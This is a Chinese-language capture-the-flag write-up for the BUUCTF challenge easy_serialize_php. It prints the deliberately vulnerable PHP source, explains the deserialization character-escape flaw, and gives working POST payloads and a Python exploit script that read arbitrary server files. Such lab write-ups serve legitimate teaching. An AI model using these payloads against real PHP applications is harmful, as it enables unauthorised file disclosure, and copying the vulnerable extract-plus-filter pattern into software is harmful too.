# Writeup 4 BUUCTF [安洵杯 2019] easy_serialize_php



## 基本信息

|   项目   | 内容                                                         |
| :------: | ------------------------------------------------------------ |
| 题目名称 | [安洵杯 2019] easy_serialize_php                             |
|   考点   | PHP 反序列化字符逃逸（键名逃逸）                             |
| 靶场地址 | `http://7e053e5b-fdbe-4979-ab78-27b5bd9076b3.node5.buuoj.cn:81/` |

---

## 一、源码

访问靶场首页，看到 `source_code` 链接，点击获取源码：

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);     // 变量覆盖漏洞点

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```



---

## 二、源码审计

### 关键函数说明

|       函数        | 作用                                              | 利用点             |
| :---------------: | ------------------------------------------------- | ------------------ |
|    `filter()`     | 删除 `php`、`flag`、`php5`、`php4`、`fl1g` 关键词 | 造成字符串长度变化 |
| `extract($_POST)` | 将 POST 参数解析为变量，可覆盖 `$_SESSION`        | 控制 SESSION 内容  |
|   `serialize()`   | 序列化 SESSION 数组                               | 生成序列化字符串   |
|  `unserialize()`  | 反序列化过滤后的字符串                            | 触发逃逸漏洞       |

### 漏洞原理

![EasySerializePHP_00-1777007585157-2.png](https://raw.gitcode.com/user-images/assets/9763554/3e879c27-8638-4081-9e68-fc2c49cea96f/EasySerializePHP_00-1777007585157-2.png 'EasySerializePHP_00-1777007585157-2.png')

---

## 三、信息收集

### 第一步：查看 phpinfo

源码中有：

```
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
```

所以发出请求：

```http
http://7e053e5b-fdbe-4979-ab78-27b5bd9076b3.node5.buuoj.cn:81/?f=phpinfo
```

在返回的页面中发现：

![phpinfo-1777008934821-5.jpg](https://raw.gitcode.com/user-images/assets/9763554/7a1a16fb-00a8-479a-bb3d-386256a62269/phpinfo-1777008934821-5.jpg 'phpinfo-1777008934821-5.jpg')

**结论：** 存在一个可疑文件 `d0g3_f1ag.php`，但 `phpinfo()` 没有直接告诉我们 flag 的位置。

**疑问：**flag在文件“d0g3_f1ag.php”中吗？

---

### 第二步：尝试读取 d0g3_f1ag.php

既然存在 `d0g3_f1ag.php`，我们尝试通过漏洞读取它。

**构造键名逃逸 Payload：**

使用HackBar:
![HackBar_01-1777009543082-7.jpg](https://raw.gitcode.com/user-images/assets/9763554/166cc3d5-a8ab-4edd-bff2-aba5d1425c2d/HackBar_01-1777009543082-7.jpg 'HackBar_01-1777009543082-7.jpg')

其中：

URL:

```http
URL:
http://846a7f62-7ae5-4e3c-9459-1c045c5ef19b.node5.buuoj.cn:81/
?f=show_image
```

POST body:

```http
_SESSION[flagphp]=;s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

点击“Execute”按钮：

页面无内容。

查看页面源代码：

```php
<?php

$flag = 'flag in /d0g3_fllllllag';

?>
```

**分析：**

- 成功读取了 `d0g3_f1ag.php` 文件
- 文件内容是一个 PHP 变量赋值：`$flag = 'flag in /d0g3_fllllllag';`
- 其中**明确给出了 flag 的存放路径**：`/d0g3_fllllllag`

---

## 四、漏洞利用

### 4.1 利用方法：键名逃逸

**核心 Payload 结构：**

```
_SESSION[flagphp] = ;s:3:"aaa";s:3:"img";s:20:"[BASE64_FILE]";}
```

**原理：** 键名 `flagphp` 中的 `flag` 被 `filter()` 删除后，序列化字符串长度变短，导致反序列化器错误解析，注入的 `img` 键值对被成功覆盖到最终数组中。

---

### 4.2 最终读取 Flag

**Base64 计算：**

```php
<?php

$str = base64_encode('/d0g3_fllllllag');
echo $str;

echo "\n";

echo ("长度是：".strlen($str));

?>
```

运行结果：

```php
L2QwZzNfZmxsbGxsbGFn
长度是：20
Process finished with exit code 0
```

**最终 Payload：**

URL：

```http
http://afa326a4-9b56-4d6b-a54f-12d3b4da8a39.node5.buuoj.cn:81/
?f=show_image
```

POST body:

```http
_SESSION[flagphp]=;s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

点击”Execute“按钮，得到flag:

```html
flag{d83251f9-a177-40dd-a3b2-fb03d645ee9e}
```

![HackBar_02-1777013966046-10.jpg](https://raw.gitcode.com/user-images/assets/9763554/361c4721-c781-4153-bef1-54b11b5811c8/HackBar_02-1777013966046-10.jpg 'HackBar_02-1777013966046-10.jpg')



---

## 五、完整的攻击流程

<img width="246" height="742" alt="完整的攻击流程" src="https://github.com/user-attachments/assets/f5d70ffe-58ab-41aa-9234-4304f600673c" />


---

## 六、Payload 总结

| 步骤 |    目标文件     |        Base64        |                          POST 数据                           |
| :--: | :-------------: | :------------------: | :----------------------------------------------------------: |
|  1   |  d0g3_f1ag.php  | ZDBnM19mMWFnLnBocA== | _SESSION[flagphp]=;s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} |
|  2   | /d0g3_fllllllag | L2QwZzNfZmxsbGxsbGFn | _SESSION[flagphp]=;s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";} |

---



## 七、Python 攻击脚本

```python
#!/usr/bin/env python3
import requests
import base64

url = "http://afa326a4-9b56-4d6b-a54f-12d3b4da8a39.node5.buuoj.cn:81/index.php"


def read_file(file_path, length=20):
    """通过反序列化逃逸读取文件"""
    b64 = base64.b64encode(file_path.encode()).decode()
    payload = f';s:3:"aaa";s:3:"img";s:{length}:"{b64}";}}'
    params = {'f': 'show_image'}
    data = {'_SESSION[flagphp]': payload}

    # 必须使用 POST 方法
    resp = requests.post(url, params=params, data=data)
    return resp.text


# 第一步：读取提示文件
print("[*] 读取 d0g3_f1ag.php...")
result = read_file("d0g3_f1ag.php")
print(result)

# 第二步：读取 Flag（必须使用 s:20）
print("\n[*] 读取 /d0g3_fllllllag...")
flag = read_file("/d0g3_fllllllag", length=20)
print(f"\n[+] Flag: {flag}")
```

运行结果：

```python
[*] 读取 d0g3_f1ag.php...
<?php

$flag = 'flag in /d0g3_fllllllag';

?>

[*] 读取 /d0g3_fllllllag...

[+] Flag: flag{d83251f9-a177-40dd-a3b2-fb03d645ee9e}


进程已结束，退出代码为 0
```



---

## 八、总结

|     要点     | 说明                                                         |
| :----------: | ------------------------------------------------------------ |
| **漏洞类型** | PHP 反序列化字符逃逸（键名逃逸）                             |
| **触发条件** | `extract($_POST)` 变量覆盖 + `filter()` 删除敏感词           |
| **攻击技巧** | 在键名中构造 `flag` 触发过滤，在值中注入序列化片段           |
| **信息收集** | `phpinfo()` 发现可疑文件 → 利用漏洞读取文件内容 → 从文件内容中找到最终路径 |
| **测试方法** | 先用 `d0g3_f1ag.php` 验证漏洞，再读取最终目标                |

---

✌✌✌

